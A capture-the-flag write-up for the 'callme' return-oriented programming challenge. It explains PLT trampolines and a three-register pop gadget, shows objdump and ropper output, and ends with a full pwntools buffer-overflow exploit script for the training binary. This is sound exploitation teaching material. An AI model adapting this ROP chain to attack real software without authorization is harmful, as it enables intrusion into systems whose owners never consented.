# Callme
This challenge is about using the Procedure Linkage Table (PLT) to make consecutive function calls without crashing. 
The goal of the challenge is to call the functions `callme_one()`, `callme_two()` and `callme_three()`, each with the arguments `0xdeadbeefdeadbeef`, `0xcafebabecafebabe` and `0xd00df00dd00df00d`. 

## PLT Trampoline
The challenge states that simply returning to `call` instructions for the target functions will likely not work. This is probably because the `call` instructions will `push` their addresses on the stack as return pointer. 
Instead, we can use the PLT as a trampoline. To get an idea of how this would work, I read the following [article](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).
The most important takeaway from the article for this challenge is that the PLT contains jumps to functions in external libraries. So if we know where the PLT is, we can directly use these jumps as trampolines to the relevant functions without needing to use the `call` instruction.
Luckily, for these challenges ASLR is disabled, so we don't have to worry about leaking PLT addresses and can simply look up the addresses of the PLT entries of our target functions. We can look up the PLT entries with the following command:
```
$ objdump -D ./callme -j .plt

./callme:     file format elf64-x86-64
Disassembly of section .plt:

...

00000000004006f0 <callme_three@plt>:
  4006f0:       ff 25 32 09 20 00       jmp    *0x200932(%rip)        # 601028 <callme_three>
  4006f6:       68 02 00 00 00          push   $0x2
  4006fb:       e9 c0 ff ff ff          jmp    4006c0 <.plt>

...

0000000000400720 <callme_one@plt>:
  400720:       ff 25 1a 09 20 00       jmp    *0x20091a(%rip)        # 601040 <callme_one>
  400726:       68 05 00 00 00          push   $0x5
  40072b:       e9 90 ff ff ff          jmp    4006c0 <.plt>

...

0000000000400740 <callme_two@plt>:
  400740:       ff 25 0a 09 20 00       jmp    *0x20090a(%rip)        # 601050 <callme_two>
  400746:       68 07 00 00 00          push   $0x7
  40074b:       e9 70 ff ff ff          jmp    4006c0 <.plt>

```




## Argument order
We need to call the functions with three arguments, which means we need gadgets to put the arguments in the right registers. 
On x86-64, the first argument is placed in the `rdi` register, the second argument in the `rsi` register and the third argument in the `rdx` register.
We can look for individual gadgets for setting every register, but luckily we are provided with a gadget to set all three registers at once:

```
$ ropper -f callme | grep "rdi"
...
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
```
To use this gadget to call the `callme_one()` function with the three arguments will thus look as follows:
```
argument_gadget = p64(0x040093c)
arg_one         = p64(0xdeadbeefdeadbeef)
arg_two         = p64(0xcafebabecafebabe)
arg_three       = p64(0xd00df00dd00df00d)
callme_one_plt  = p64(0x400720)

payload += argument_gadget + arg_one + arg_two + arg_three
payload += callme_one_plt
```

For our final payload, we simply have to repeat this for all three of our functions. The final script is thus as follows:
```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./callme"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

argument_gadget = p64(0x040093c)

arg_one   = p64(0xdeadbeefdeadbeef)
arg_two   = p64(0xcafebabecafebabe)
arg_three = p64(0xd00df00dd00df00d)

callme_one_plt   = p64(0x400720)
callme_two_plt   = p64(0x400740)
callme_three_plt = p64(0x4006f0)

payload = b"A" * 40

payload += argument_gadget + arg_one + arg_two + arg_three
payload += callme_one_plt

payload += argument_gadget + arg_one + arg_two + arg_three
payload += callme_two_plt

payload += argument_gadget + arg_one + arg_two + arg_three
payload += callme_three_plt

io.sendlineafter(b">", payload)
io.interactive()
```

